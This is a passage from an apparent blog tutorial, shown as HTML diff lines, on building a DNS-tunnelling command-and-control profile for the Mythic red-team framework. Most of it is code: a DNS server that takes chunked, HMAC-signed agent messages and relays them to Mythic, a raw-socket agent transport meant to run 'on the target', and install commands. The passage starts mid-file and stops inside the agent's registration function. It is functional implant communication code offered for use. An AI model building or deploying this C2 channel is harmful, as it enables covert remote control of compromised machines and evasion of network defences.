+</span></span><span style="display:flex;"><span>        response<span style="color:#f92672">.</span>Message <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Configuration looks good&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> response
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">async</span> <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">opsec_check</span>(self, inputMsg: C2OPSECMessage) <span style="color:#f92672">-&gt;</span> C2OPSECMessageResponse:
+</span></span><span style="display:flex;"><span>        response <span style="color:#f92672">=</span> C2OPSECMessageResponse(Success<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>        domain <span style="color:#f92672">=</span> inputMsg<span style="color:#f92672">.</span>Parameters<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;dns_domain&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> domain <span style="color:#f92672">in</span> (<span style="color:#e6db74">&#34;infra.domain.name&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>):
+</span></span><span style="display:flex;"><span>            response<span style="color:#f92672">.</span>Message <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Warning: using default domain, make sure NS delegation is configured&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            response<span style="color:#f92672">.</span>Message <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Configuration looks good&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> response
+</span></span></code></pre></div><p>Key things to note:</p>
+<ul>
+<li><code>is_server_routed = True</code> tells Mythic that agents connect through this C2 profile&rsquo;s server, not directly</li>
+<li><code>server_binary_path</code> is what Mythic executes when you click <strong>Start</strong> on the C2 profile page</li>
+</ul>
+<h3 id="the-dns-server">The DNS Server</h3>
+<p>This is the core of the profile. It handles all incoming DNS queries, manages channel state, assembles inbound messages, forwards them to Mythic, and chunks outbound responses for DNS delivery.</p>
+<p>The full file is long, here are the key components:</p>
+<h4 id="helpers">Helpers</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>HMAC_SECRET <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;weedns_secret&#34;</span>
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">verify_hmac</span>(data: str, sig: str) <span style="color:#f92672">-&gt;</span> bool:
+</span></span><span style="display:flex;"><span>    expected <span style="color:#f92672">=</span> hmac<span style="color:#f92672">.</span>new(HMAC_SECRET, data<span style="color:#f92672">.</span>encode(), hashlib<span style="color:#f92672">.</span>md5)<span style="color:#f92672">.</span>hexdigest()[:<span style="color:#ae81ff">8</span>]
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> hmac<span style="color:#f92672">.</span>compare_digest(expected, sig)
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">make_hmac</span>(data: str) <span style="color:#f92672">-&gt;</span> str:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> hmac<span style="color:#f92672">.</span>new(HMAC_SECRET, data<span style="color:#f92672">.</span>encode(), hashlib<span style="color:#f92672">.</span>md5)<span style="color:#f92672">.</span>hexdigest()[:<span style="color:#ae81ff">8</span>]
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">b64url_decode</span>(s: str) <span style="color:#f92672">-&gt;</span> bytes:
+</span></span><span style="display:flex;"><span>    s <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;-&#34;</span>, <span style="color:#e6db74">&#34;+&#34;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;_&#34;</span>, <span style="color:#e6db74">&#34;/&#34;</span>)
+</span></span><span style="display:flex;"><span>    s <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;=&#34;</span> <span style="color:#f92672">*</span> (<span style="color:#f92672">-</span>len(s) <span style="color:#f92672">%</span> <span style="color:#ae81ff">4</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> base64<span style="color:#f92672">.</span>b64decode(s)
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">b64url_encode</span>(b: bytes) <span style="color:#f92672">-&gt;</span> str:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> base64<span style="color:#f92672">.</span>b64encode(b)<span style="color:#f92672">.</span>decode()<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;+&#34;</span>, <span style="color:#e6db74">&#34;-&#34;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;/&#34;</span>, <span style="color:#e6db74">&#34;_&#34;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;=&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>)
+</span></span></code></pre></div><h4 id="mythic-bridge">Mythic Bridge</h4>
+<p>This is how the server forwards assembled agent messages to Mythic&rsquo;s internal API. The <code>mythic: dns</code> header is mandatory, without it Mythic rejects the request with a 400 and logs <code>Failed to get 'mythic' header</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>MYTHIC_URL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://127.0.0.1:17443&#34;</span>
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">async</span> <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">forward_to_mythic</span>(data: bytes) <span style="color:#f92672">-&gt;</span> bytes:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">async</span> <span style="color:#66d9ef">with</span> aiohttp<span style="color:#f92672">.</span>ClientSession() <span style="color:#66d9ef">as</span> session:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">async</span> <span style="color:#66d9ef">with</span> session<span style="color:#f92672">.</span>post(
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>MYTHIC_URL<span style="color:#e6db74">}</span><span style="color:#e6db74">/agent_message&#34;</span>,
+</span></span><span style="display:flex;"><span>            data<span style="color:#f92672">=</span>data,
+</span></span><span style="display:flex;"><span>            headers<span style="color:#f92672">=</span>{
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;Content-Type&#34;</span>: <span style="color:#e6db74">&#34;application/octet-stream&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;mythic&#34;</span>: <span style="color:#e6db74">&#34;dns&#34;</span>
+</span></span><span style="display:flex;"><span>            },
+</span></span><span style="display:flex;"><span>            timeout<span style="color:#f92672">=</span>aiohttp<span style="color:#f92672">.</span>ClientTimeout(total<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span>)
+</span></span><span style="display:flex;"><span>        ) <span style="color:#66d9ef">as</span> resp:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">await</span> resp<span style="color:#f92672">.</span>read()
+</span></span></code></pre></div><h4 id="inbound-assembly">Inbound Assembly</h4>
+<p>The server stores chunks in a dict keyed by channel ID. Once all chunks arrive it assembles and decodes them:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">assemble_inbound</span>(channel_id: str) <span style="color:#f92672">-&gt;</span> bytes <span style="color:#f92672">|</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>    ch <span style="color:#f92672">=</span> channels<span style="color:#f92672">.</span>get(channel_id)
+</span></span><span style="display:flex;"><span>    total <span style="color:#f92672">=</span> ch<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;inbound_total&#34;</span>, <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>    chunks <span style="color:#f92672">=</span> ch[<span style="color:#e6db74">&#34;inbound&#34;</span>]
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> len(chunks) <span style="color:#f92672">&lt;</span> total:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>    assembled <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(total):
+</span></span><span style="display:flex;"><span>        assembled <span style="color:#f92672">+=</span> chunks[i]
+</span></span><span style="display:flex;"><span>    assembled <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;=&#34;</span> <span style="color:#f92672">*</span> (<span style="color:#f92672">-</span>len(assembled) <span style="color:#f92672">%</span> <span style="color:#ae81ff">4</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> b64url_decode(assembled)
+</span></span></code></pre></div><h4 id="outbound-chunking">Outbound Chunking</h4>
+<p>The raw Mythic HTTP response bytes are base64url encoded and split into 40-char chunks for DNS delivery:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">prepare_outbound</span>(channel_id: str, data: bytes):
+</span></span><span style="display:flex;"><span>    encoded <span style="color:#f92672">=</span> b64url_encode(data)
+</span></span><span style="display:flex;"><span>    chunks <span style="color:#f92672">=</span> [encoded[i:i<span style="color:#f92672">+</span><span style="color:#ae81ff">40</span>] <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(encoded), <span style="color:#ae81ff">40</span>)]
+</span></span><span style="display:flex;"><span>    channels[channel_id][<span style="color:#e6db74">&#34;outbound&#34;</span>] <span style="color:#f92672">=</span> chunks
+</span></span><span style="display:flex;"><span>    channels[channel_id][<span style="color:#e6db74">&#34;state&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;send&#34;</span>
+</span></span></code></pre></div><h4 id="dns-resolver">DNS Resolver</h4>
+<p>The resolver handles all four message types. The send handler (<code>s</code>) is the most complex, it receives chunks, verifies HMAC, assembles the message when complete, forwards to Mythic, and signals <code>DONE</code> to the agent:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">elif</span> msg_type <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;s&#34;</span>:
+</span></span><span style="display:flex;"><span>    seq   <span style="color:#f92672">=</span> int(parts[<span style="color:#ae81ff">2</span>], <span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>    total <span style="color:#f92672">=</span> int(parts[<span style="color:#ae81ff">3</span>], <span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>    data  <span style="color:#f92672">=</span> parts[<span style="color:#ae81ff">4</span>]
+</span></span><span style="display:flex;"><span>    sig   <span style="color:#f92672">=</span> parts[<span style="color:#ae81ff">5</span>]
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> verify_hmac(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>channel_id<span style="color:#e6db74">}{</span>seq<span style="color:#e6db74">}{</span>data<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>, sig):
+</span></span><span style="display:flex;"><span>        reply<span style="color:#f92672">.</span>add_answer(RR(qname, QTYPE<span style="color:#f92672">.</span>TXT, rdata<span style="color:#f92672">=</span>TXT(<span style="color:#e6db74">&#34;ERR&#34;</span>)))
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> reply
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>    channels[channel_id][<span style="color:#e6db74">&#34;inbound&#34;</span>][seq] <span style="color:#f92672">=</span> data
+</span></span><span style="display:flex;"><span>    channels[channel_id][<span style="color:#e6db74">&#34;inbound_total&#34;</span>] <span style="color:#f92672">=</span> total
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>    received <span style="color:#f92672">=</span> set(channels[channel_id][<span style="color:#e6db74">&#34;inbound&#34;</span>]<span style="color:#f92672">.</span>keys())
+</span></span><span style="display:flex;"><span>    next_seq <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> next_seq <span style="color:#f92672">in</span> received:
+</span></span><span style="display:flex;"><span>        next_seq <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> next_seq <span style="color:#f92672">&gt;=</span> total:
+</span></span><span style="display:flex;"><span>        assembled <span style="color:#f92672">=</span> assemble_inbound(channel_id)
+</span></span><span style="display:flex;"><span>        mythic_response <span style="color:#f92672">=</span> sync_forward_to_mythic(assembled)
+</span></span><span style="display:flex;"><span>        prepare_outbound(channel_id, mythic_response)
+</span></span><span style="display:flex;"><span>        reply<span style="color:#f92672">.</span>add_answer(RR(qname, QTYPE<span style="color:#f92672">.</span>TXT, rdata<span style="color:#f92672">=</span>TXT(<span style="color:#e6db74">&#34;DONE&#34;</span>)))
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        reply<span style="color:#f92672">.</span>add_answer(RR(qname, QTYPE<span style="color:#f92672">.</span>TXT,
+</span></span><span style="display:flex;"><span>            rdata<span style="color:#f92672">=</span>TXT(format(next_seq, <span style="color:#e6db74">&#34;04x&#34;</span>))))
+</span></span></code></pre></div><p>The poll handler (<code>p</code>) serves chunks sequentially:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">elif</span> msg_type <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;p&#34;</span>:
+</span></span><span style="display:flex;"><span>    seq <span style="color:#f92672">=</span> int(parts[<span style="color:#ae81ff">2</span>], <span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>    ch <span style="color:#f92672">=</span> channels<span style="color:#f92672">.</span>get(channel_id)
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> ch <span style="color:#f92672">or</span> ch[<span style="color:#e6db74">&#34;state&#34;</span>] <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;send&#34;</span> <span style="color:#f92672">or</span> <span style="color:#f92672">not</span> ch[<span style="color:#e6db74">&#34;outbound&#34;</span>]:
+</span></span><span style="display:flex;"><span>        reply<span style="color:#f92672">.</span>add_answer(RR(qname, QTYPE<span style="color:#f92672">.</span>TXT, rdata<span style="color:#f92672">=</span>TXT(<span style="color:#e6db74">&#34;IDLE&#34;</span>)))
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> reply
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>    chunks <span style="color:#f92672">=</span> ch[<span style="color:#e6db74">&#34;outbound&#34;</span>]
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> seq <span style="color:#f92672">&gt;=</span> len(chunks):
+</span></span><span style="display:flex;"><span>        channels[channel_id][<span style="color:#e6db74">&#34;state&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;idle&#34;</span>
+</span></span><span style="display:flex;"><span>        reply<span style="color:#f92672">.</span>add_answer(RR(qname, QTYPE<span style="color:#f92672">.</span>TXT, rdata<span style="color:#f92672">=</span>TXT(<span style="color:#e6db74">&#34;END&#34;</span>)))
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        chunk <span style="color:#f92672">=</span> chunks[seq]
+</span></span><span style="display:flex;"><span>        sig <span style="color:#f92672">=</span> make_hmac(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>channel_id<span style="color:#e6db74">}{</span>seq<span style="color:#e6db74">}{</span>chunk<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        reply<span style="color:#f92672">.</span>add_answer(RR(qname, QTYPE<span style="color:#f92672">.</span>TXT,
+</span></span><span style="display:flex;"><span>            rdata<span style="color:#f92672">=</span>TXT(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>chunk<span style="color:#e6db74">}</span><span style="color:#e6db74">.</span><span style="color:#e6db74">{</span>sig<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)))
+</span></span></code></pre></div><h4 id="server-startup">Server Startup</h4>
+<p>Both UDP and TCP are served on port 53:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>udp_server <span style="color:#f92672">=</span> DNSServer(resolver, port<span style="color:#f92672">=</span><span style="color:#ae81ff">53</span>, address<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0.0.0.0&#34;</span>, tcp<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>tcp_server <span style="color:#f92672">=</span> DNSServer(resolver, port<span style="color:#f92672">=</span><span style="color:#ae81ff">53</span>, address<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0.0.0.0&#34;</span>, tcp<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>udp_server<span style="color:#f92672">.</span>start_thread()
+</span></span><span style="display:flex;"><span>tcp_server<span style="color:#f92672">.</span>start_thread()
+</span></span></code></pre></div><h3 id="installing-into-mythic">Installing Into Mythic</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cd /home/arvee/Mythic
+</span></span><span style="display:flex;"><span>sudo ./mythic-cli add dns_c2
+</span></span><span style="display:flex;"><span>sudo ./mythic-cli build dns_c2
+</span></span></code></pre></div><p>Verify it starts and connects to RabbitMQ:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo ./mythic-cli logs dns_c2
+</span></span></code></pre></div><p>You should see:</p>
+<pre tabindex="0"><code>CRITICAL ... GetConnection ... [+] Successfully connected to rabbitmq
+</code></pre><p>The DNS profile now appears in Mythic.</p>
+
+    <img src="/mythic/dns/dns_profile.png"  alt="dns profile appears in status"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<h2 id="agent-side-transport">Agent-Side Transport</h2>
+<p>The transport layer lives in the agent and is responsible for encoding data into DNS queries and decoding responses. It follows the exact same template structure as the existing HTTP transport in <code>weeagent</code>, so the builder can inject it transparently.</p>
+<h3 id="template-structure">Template Structure</h3>
+<p>The transport file uses section markers that the builder&rsquo;s template engine replaces:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Plaintext" data-lang="Plaintext"><span style="display:flex;"><span>### IMPORTS ###
+</span></span><span style="display:flex;"><span>### CLASS_FIELDS ###
+</span></span><span style="display:flex;"><span>### FUNCTIONS ###
+</span></span><span style="display:flex;"><span>### CONFIG ###
+</span></span></code></pre></div><h3 id="raw-dns-implementation">Raw DNS Implementation</h3>
+<p>We implemented DNS queries from scratch using Python&rsquo;s <code>socket</code> and <code>struct</code> modules, no external dependencies. This keeps the agent portable and avoids needing <code>dnspython</code> on the target.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_dns_txt_query</span>(self, fqdn):
+</span></span><span style="display:flex;"><span>    dns_server <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>agent_config[<span style="color:#e6db74">&#34;DNSServer&#34;</span>]
+</span></span><span style="display:flex;"><span>    tx_id <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">65535</span>)
+</span></span><span style="display:flex;"><span>    flags <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0100</span>
+</span></span><span style="display:flex;"><span>    header <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&gt;HHHHHH&#34;</span>, tx_id, flags, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>    labels <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> part <span style="color:#f92672">in</span> fqdn<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;.&#34;</span>):
+</span></span><span style="display:flex;"><span>        encoded <span style="color:#f92672">=</span> part<span style="color:#f92672">.</span>encode()
+</span></span><span style="display:flex;"><span>        labels <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;B&#34;</span>, len(encoded)) <span style="color:#f92672">+</span> encoded
+</span></span><span style="display:flex;"><span>    labels <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>    question <span style="color:#f92672">=</span> labels <span style="color:#f92672">+</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&gt;HH&#34;</span>, <span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">1</span>)  <span style="color:#75715e"># TXT, IN</span>
+</span></span><span style="display:flex;"><span>    packet <span style="color:#f92672">=</span> header <span style="color:#f92672">+</span> question
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>    sock <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_DGRAM)
+</span></span><span style="display:flex;"><span>    sock<span style="color:#f92672">.</span>settimeout(<span style="color:#ae81ff">5</span>)
+</span></span><span style="display:flex;"><span>    sock<span style="color:#f92672">.</span>sendto(packet, (dns_server, <span style="color:#ae81ff">53</span>))
+</span></span><span style="display:flex;"><span>    response, _ <span style="color:#f92672">=</span> sock<span style="color:#f92672">.</span>recvfrom(<span style="color:#ae81ff">4096</span>)
+</span></span><span style="display:flex;"><span>    sock<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>_parse_dns_txt_response(response, tx_id)
+</span></span></code></pre></div><p>The response parser manually walks the DNS wire format to extract TXT strings:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_parse_dns_txt_response</span>(self, data, expected_tx_id):
+</span></span><span style="display:flex;"><span>    tx_id <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#34;&gt;H&#34;</span>, data[<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">2</span>])[<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> tx_id <span style="color:#f92672">!=</span> expected_tx_id:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    ancount <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#34;&gt;H&#34;</span>, data[<span style="color:#ae81ff">6</span>:<span style="color:#ae81ff">8</span>])[<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ancount <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>    offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">12</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># skip question section</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> data[offset] <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>        offset <span style="color:#f92672">+=</span> data[offset] <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>    offset <span style="color:#f92672">+=</span> <span style="color:#ae81ff">5</span>  <span style="color:#75715e"># null byte + qtype + qclass</span>
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># parse answer TXT records</span>
+</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(ancount):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (data[offset] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xC0</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xC0</span>:
+</span></span><span style="display:flex;"><span>            offset <span style="color:#f92672">+=</span> <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">while</span> data[offset] <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>                offset <span style="color:#f92672">+=</span> data[offset] <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>            offset <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>        rtype, _, _, rdlength <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#34;&gt;HHIH&#34;</span>, data[offset:offset<span style="color:#f92672">+</span><span style="color:#ae81ff">10</span>])
+</span></span><span style="display:flex;"><span>        offset <span style="color:#f92672">+=</span> <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> rtype <span style="color:#f92672">==</span> <span style="color:#ae81ff">16</span>:
+</span></span><span style="display:flex;"><span>            end <span style="color:#f92672">=</span> offset <span style="color:#f92672">+</span> rdlength
+</span></span><span style="display:flex;"><span>            pos <span style="color:#f92672">=</span> offset
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">while</span> pos <span style="color:#f92672">&lt;</span> end:
+</span></span><span style="display:flex;"><span>                txt_len <span style="color:#f92672">=</span> data[pos]; pos <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>                result <span style="color:#f92672">+=</span> data[pos:pos<span style="color:#f92672">+</span>txt_len]<span style="color:#f92672">.</span>decode(errors<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;replace&#34;</span>)
+</span></span><span style="display:flex;"><span>                pos <span style="color:#f92672">+=</span> txt_len
+</span></span><span style="display:flex;"><span>        offset <span style="color:#f92672">+=</span> rdlength
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> result
+</span></span></code></pre></div><h3 id="registration">Registration</h3>
+<p>On first use, the agent registers with the server to get a channel ID:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_register</span>(self):
